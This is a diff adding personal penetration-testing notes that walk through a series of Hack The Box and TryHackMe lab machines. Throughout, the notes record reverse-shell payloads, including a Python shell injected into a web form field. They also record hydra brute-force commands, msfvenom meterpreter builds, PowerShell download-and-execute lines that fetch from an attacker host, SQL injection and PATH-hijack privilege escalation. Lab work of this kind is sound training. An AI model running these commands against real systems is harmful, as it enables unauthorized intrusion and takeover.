@@ -1,0 +1,349 @@
+HTB - MetaTwo
+	
+
+HTB - Photobomb
+	- nmap -sV -A -Pn -p- 10.10.11.182 -o service_nmap.txt
+		- port 80 returned. need to add domain to /etc/hosts and re run
+		- nmap identified opwn ssh 8.2 and nginx server 1.18 --> check version of nginx for exploits
+	- sudo /home/kali/.local/bin/autorecon 10.10.11.182 -o basic_autorecon
+	- Searchsploit nginx
+		- looks secure
+	- visit web page
+		- looks like there is a login to admin page linked to home page. Try some sql injection
+	- SQL injection attempts didn't work
+	- Inspect http traffic history
+		- find premade credentials in javascript script running on page --> get access to webpage: http://pH0t0:b0Mb!@photobomb.htb/printer
+	- dirb http://photobomb.htb/printer /usr/share/wordlists/SecLists-master/Discovery/Web-Content/raft-medium-directories.txt -u pH0t0:b0Mb! -o printer_fuzzing.txt
+		- try and find more directories nested under printer
+	- Open burpsuite proxy and use some functionality of the web page, examine traffic
+		- No other services to check version of
+		- no other fields for direct user input
+		- looks like the download service provides 3 fields to the server in post request
+			- after altering fields we can cause an internal server error --> this is an indication these fields might be available to code injection
+			- try to inject a reverse shell for js
+		- try some java reverse shells --> these don't work  because we are sendign the request to a web server --> need something encoded
+		- try python reverse shells
+	- Code injection into dowload request --> injected reverse shell
+	-in the 2nd field we supply jpg;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.155",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+		- use burpsuite decoder to encode in url
+		- use repeater to send to web server
+		- gained connection 
+	- sudo -l
+		- we see the user can run cleanup.sh as root. let's look at the script
+			- root owned --> we cannot edit the script
+			- calls cat --> can i force an escape sequence?
+				- no looks like I could only read privileged files, but I can't specify the file here
+			- only wildcard is for making all jpg's root owned
+				- chown won't change the file permisions. Looks like I can create a bash script with the .jpg exetension and get a root shell
+				- THIS THOUGHT WAS WRONG
+			- the path for "find" was not specified
+				- cd to a writable directory (in this case wizard's home)
+				- echo /bin/bash > find
+				- execcute cleanup.sh and prepend the current directory to the path variable
+					```
+					bash sudo PATH=$PWD:$PATH /opt/cleanup.sh
+					``` 
+					- we are now root :)
+
+THM - Daily Bugle
+	nmap -sV -Pn -A 10.10.106.180
+		get results for ssh and a web server running, and mysql
+		Web server
+		- joomla
+		- apache 2.4.6
+		- PHP 5.6.40
+	run dirbuster
+		notice administrator login page
+	Navigate to admin login
+		Notice Joomblah running
+		view source code to see it is joomla 3.7.0
+	Searchsploit joomla 3.7.0
+		Gets a few results, but thm mentions a python script
+	google joomblah 3.7.0 exploit
+		find github for joomblah
+		download and use
+	python joomblah http://10.10.1.1.62
+		we get the hash for the user jonah
+	hashid -j jonah_hash.txt
+		identifies hash type as bcrypt for John the ripper
+	john returns spiderman123 as the password
+
+THM - Skynet
+	- nmap -sV -Pn -A 10.10.69.70
+		- results return open smb/netbios prots
+		- results return 1 http server, Dovecot pop3 and imap
+	- nikto -host 10.10.69.70
+		- find squirrelMail/src/read_body.php
+		- Apache server 2.4.18
+	- nmap -p- -sV -sC 10.10.69.70
+		- no other ports found
+		- server name is skynet
+	- smbclient //10.10.69.70/anonymous
+		- this worked
+		- pulling down files attention.txt, and 3 logs
+		- attention.txt: memo to change passwords --> no sensitive info
+		- log1.txt: wordlist of various usernames or potential passwords
+		- log2.txt and 3 blank
+	- hydra -l SKYNET -P ./thm_files/skynet/log1.txt -v 10.10.69.70 smb
+		- didn't work
+	- searchsploit apache 2.4.18
+		- roughly 12 results
+			- tryed memory leak one -> no results
+	- searchsploit openssh
+		- 1 result matches our version
+			- couldn't get to run due to clock issue, might circle back
+			- edited to use newer package
+			- named ossh_enum.py
+				- ran with log1.txt --> no results --> these might be passwords
+	- searchsploit squirrelmail
+		- 1 vuln related to cross site scripting
+	- gobuster dir -u 10.10.69.70 -w /usr/share/wordlists/dirb/big.txt
+		- reveals squirrelmail directory
+	- using burpsuite inturder attack
+		- sniper
+			- set payload to be the log1.txt file. Set for password.
+			- We see the first pw works
+	- Login with cracked credentials
+		- username: milesdyson
+		- password: cyborg007haloterminator
+		- find temporary samba password:)s{A&2Z=F^n_E.B`
+	- smbclient -U milesdyson //10.10.157.208/milesdyson
+		- traverse all file directories and find important.txt
+		- reveals a hidden directory: /45kra24zxs28v3yd
+	- navigate to hidden directory
+	- circle back to squirell mail vulns now that we have access to the service
+	- there is one for local file inclusion.
+		- a user can execute arbitrary php code in the url
+		- let's try to execute php reverse shell
+		- doesn't work
+	- gobuster dir -u 10.10.116.186/45kra24zxs28v3yd -w /usr/share.wordlists/dirb/big.txt
+		- circle back arnd run gobuster on the hidden directory we found
+		- find and admin directory off of it /administrator
+		- navigate to it
+		- see cuppa cms is the service running
+	- searchsploit cuppa cms
+		- we see one exploit
+		- it is for php code, find phpreverse shell
+		- execute per text and gain reverse shell
+	- rhost: wget http://10.6.47.234/linpeas.sh
+		- move linpeas onto system
+	- ./linpeas.sh
+		- vulnerable to CVE-2021-4034
+			-this is plokit, yeah buddy
+	-get exploit
+		host on lhost http server
+		use wget to move to rhost
+		comple
+		run
+		win
+
+THM - Gamezone
+	1. nmap -sV -Pn -A 10.10.180.133
+		1. see there is a web server
+	2. navigate to web server
+	3. use sql injection to log in
+		1. set username to ' or 1=1 -- - and leave password blank
+		2. get rediected to another page where we can search game reviews
+			1. going to try and see if we can use SQLmap against the database
+	4.  Capture game search query using Burpsuite
+		1. Save off request for game search --> we can feed this to SQLmap
+	5. sqlmap -r gamezone_sql.txt --dbms=mysql --dump
+		1. will try and dump all the sql databases it can find, also notes other fields that may be vulnerable to sql injection
+		2. we get a database with users and hashed password --> note hahsing algorithm is SHA256
+	6. echo "<hash>" > gamezone_hash.txt
+	7. john gamezone_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
+	8. ssh agent47@10.10.180.133
+	9. rhost: ss -tulnp
+		1. see what sockets are listening on rhost
+		2. looking to see if there is anything interesting to connect to
+		3. identify port 10000, but it is blocked by firewall, can't connect from lhost
+	10. ssh -L 10000:localhost:10000 agent47@10.10.180.133
+		1. use reverse ssh port forawrding to bypass firewall
+		2. forward localhost:10000 (on target machine / rhost) to port 10000 of machine making the ssh request (lhost)
+		3. lhost: navigate to localhost:10000 to see the web page now
+	11. use burpsuite proxy to look at http history and determine version
+		1. miniserv/1.58
+	12. search metasploit for exploit
+		1. use one for RCE
+		2. set payload /unix/cmd/reverse
+		3. set options
+			1. remember we need to point exploit towards the port forward server on lhost
+			2. disable ssl
+		4. run --> get root shell
+	13. navigate to, then cat root.txt
+
+THM - Alfred
+	 1. nmap -sV -Pn
+		 1. See webservers running on 80 and 8080
+			 1. 80 is a genric page
+			 2. 8080 is a jenkins login page
+	 2. run burpsuite proxy and try to log in
+		 1. look at history to see the method being used http-POST
+		 2. get the request field format for hydra
+	 3. hydra -s 8080 -V -l admin -P /usr/share/wordlists/short.txt 10.10.92.79 http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
+	 4. login to Jenkins with cracked credentials admin:admin
+	 5. nc -vlnp 50001
+		 1. set up listener
+	 6. create new project to download and execute reverse shell
+		 1. process detailed in reverse shells Jenkins -Windows
+	 7. msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
+		 1. create meterpreter reverse shell to use. Will make priv esc easier.
+		 2. once reverse shell is gained we can switch to meterpreter shell for easier priv esc
+	 8. msf console
+	 9. use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run
+	 10. {on target} powershell "(New-Object System.Net.WebClient).Downloadfile('http://<10.6.47.234>:8000/shell-name.exe','shell-name.exe')"
+		 1. we gained the reverse tcp m
+
+THM - vulnerviersity
+	1. nmap -Sv --> reveal open ports
+	2. gobuster --> run against apache server to brute force directories
+		1. Find direcotry with upload form
+	3. Burpsuite
+		1. Use to interepct traffic while uploadng and change file extensions
+		2. find file extension that is accepted by the upload function --> attack vector identified
+	4. Get reverse shell
+		1. Start listener
+			2. nc -lvnp 1234
+		2. upload reverse shell file <file_name>
+		3. Navigate to http://<ip>:3333/internal/upload/<file_name>
+	5. search fome directories to find user.txt
+	6. Search for SUID files for priv esc
+		1. notice systemctl is suid
+		2. create service using echo --> see linux commands
+		3. gain reverse shell
+
+THM - Kenobi
+	1. nmsap -sV  --> reveal open ports
+		1. we see it is a linux machine with Samba running
+	2. nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.121.196
+		1. Enumerate Samba shares
+	3. smbclient //10.10.121.196/anonymous
+		1. we try connecting tot he anonymous share without a password. it works
+		2. find log.txt file
+		3. see ftp config
+	4. nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.121.196
+		1. see var is mountable by all
+	5. from log.txt we also saw the location of ssh keys
+	6. we note the mod_copy exploit for the PROFTP version allows a remote user to copy files to/from anywhere on the system
+	7. nc <ip> 21
+		1. connect to the ftp server using SITE CPFR and SITE CPTO
+		2. SITE CPFR <target file>
+		3. SITE CPTO <target destination>
+		4. In this case we move the ssh private key "id_rsa" to the /var/tmp because we know we can mount /var to get access to the key
+	8. mount machine_ip:/var /mnt/kenobiNFS
+		1. mount /var and copy ssh key to a local directory
+	9. chmod 600 id_rsa
+		1. need to change ssh key to the correct permissions
+	10. ssh -i id_rsa kenobi@<ip>
+		1. we're in. Time to escalate
+	11. find / -perm -u=s -type f 2>/dev/null
+		1. Check for binaries that have the suid bit set
+		2. we see usr/bin/menu which is not a standard binary
+	12. Strings /usr/bin/menu
+		1. We see the binary is calling standard binaries without using the full path
+		2. we can exploit this by copying /usr/sh to "curl" and setting our path locally
+	13. Exploit
+		1. echo /bin/sh > curl
+		2. chmod 777 curl
+		3. export PATH=/tmp:$PATH
+		4. /usr/bin/menu
+			1. choose option 1 which calls curl and we get a root shell
+			2
+
+THM - Steel Mountain
+	1. nmap -sV 10.10.61.52
+		1. We see that the box doesn't respond to pings (ICMP)
+	2. nmap -Pn -sV 10.10.61.52
+		1. This get's results
+		2. based on the thm question the results look incomplete
+	3.  nmap -Pn -sV  -A 10.10.61.52
+		1. This gives the most results
+		2. We see a file server is running, but isn't evident what service it is
+	4. visit 10.10.61.52
+		1. click link for file server info
+		2. we see it is rejetto http file server
+	5. Searchsploit rejetto
+		1. Exploits available for the version of the server running
+	6. msfconsole
+		1. Search rejetto
+		2. use 0
+		3. set RHOSTS 10.10.61.52
+		4. set RPORT 8080
+		5. set SRVHOST 10.6.47.234
+		6. using default meterpreter revese shell
+		7. set LHOST 10.6.47.234
+	7. exploit
+		1. This gets us a meterpreter shell
+	8. dir user.txt /s /p
+		1. find user.txt on C:\Users\bill\Desktop
+	9. upload /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
+		1. uploads our privesc script into meterpreter shell
+	10. load powershell
+	11. powershell_shell
+		1. Starts powershell session through meterpreter on target machine
+
+THM - HackPark
+	1. nmap -Pn -sV -A 
+		1. We see web pages running n port 80 and 3389
+	2. Open Burpsuite
+		1. Use browser and capture login prompt attempt
+		2. look in http history to find podt form
+	3. Hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.224.151 http-post-form "//Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=V7HawuOcG6OIM6idlDq8iiDTPDWLSpTJsxhqcJsHWw6uaYMk1vOpW6n9277GyhTpoioFb6XW34TzQ9YuK05M0K3jELDo9DYivpi5tlkDgmhSWPkeudR3N51l1e37mOvh6evzENiJkOPyxk8lezhletqbRuf3jSRfaie5A1REIy%2Bik4k7&__EVENTVALIDATION=hxakzHCsP3cGeFbZPRRoMCKxjU%2FMK%2F4%2FZpBszh3GiMvIJMgGv41VhmRZGr4siy175H%2BA7B5QfYRTYW9idXPCCb0JtUxNe9rTm%2BMUTtc27V3Rsjhk7q3htYD%2By2rJ4G1nxNpSf0bhkYCrQ0rSHnRlWiguekRJ%2FxxF32qh%2B5aRpqg%2BOK2T&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
+		1. Password cracked: host: 10.10.224.151   login: admin   password: 1qaz2wsx
+	4.  Enter cracked credentails
+	5. Searchsploit blogengine
+		1. This is the service running, version 3.3.6.0
+		2. We see there are searchsploit modules
+		3. use module 46353
+	6. Edit exploit to add in LHOST IP, will call back reverse shell to LHOST
+	7. nc -vlnp 4445
+		1. set up listener
+	8. Follow directions inexploit
+		1. upload file
+		2. navigate to compromised url to intiate execution of reverse shell
+	9. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.6.47.234 LPORT=4443 -e x86/shikata_ga_nai -f exe -o my_shell.exe
+		1. Create meterpreter reverse shell execuable for port 4443
+	10.  python -m SimpleHTTPServer 6666
+		1. host simple http server so reverse shell can pull .exe onto rhost
+	11. on rhost: powershell -c "IInvoke-WebRequest -Uri 'http://10.6.47.234:8000/my_shell.exe' -OutFile 'C:\Windows\Temp\my_shell.exe'"
+		1. Navigate to temp directory first. Usually world writeable
+	12. lhost: msfconsole
+		1. use /explot/multi/handler
+		2. set payload windows/meterpreter/reverse_tcp
+		3. Set lhost and lport
+	13. rhost: start my_shell.exe
+	14. upload winPEAS.bat file to identify vectors for priv esc
+		1. cp winPEAS.bat ~/web_server
+		2. rhost: powershell -c "Invoke-WebRequest -Uri 'http://10.6.47.234:8000/winPEAS.bat' -OutFile 'C:\Windows\Temp\winPEAS.bat'"
+	15. winPEASany.exe
+		1. Focus on proccess and servie results
+			1. we see WindowsScheduler is a non native service and has r/w permissions for everyone
+			2. go to program file dir
+			3. check log, but we don't see an executable
+			4. go to events directory, check log
+			5. we see messages.exe is occasionally run
+	16. create reverse shell to rename as Message.exe
+		1. copy to web server
+	17. lhost: rename "Message.exe" "Message.bak"
+		1. rename the vulnerable exe so we can upload the reverse shell
+	18. powershell -c "Invoke-WebRequest -Uri 'http://10.6.47.234:8000/Message.exe' -OutFile 'Message.exe'"
+	19. nc -vlnp 6666
+		1. Eventually the rhost connects and we have a root shell
+
+
+THM - Relevant
+	nmap -Sv -Pn -A 10.10.88.6
+		smb
+			signing not enabled
+		rdp
+	smbclient -L <ip>
+		we see there is a network share nt4wrksv
+		connect to share with blank password
+		get passwords.txt file
+			says encoded - we don't know what type --> use burpsuite decoder to brute force it
+			its base 64, recovered credentialls:
+				Bob - !P@$$W0rD!123
+				Bill - Juw4nnaM4n420696969!$$$ 
+	xfreerdp /u:RELEVANT\Bill /v:10.10.88.6
+		both credentials expried
+	
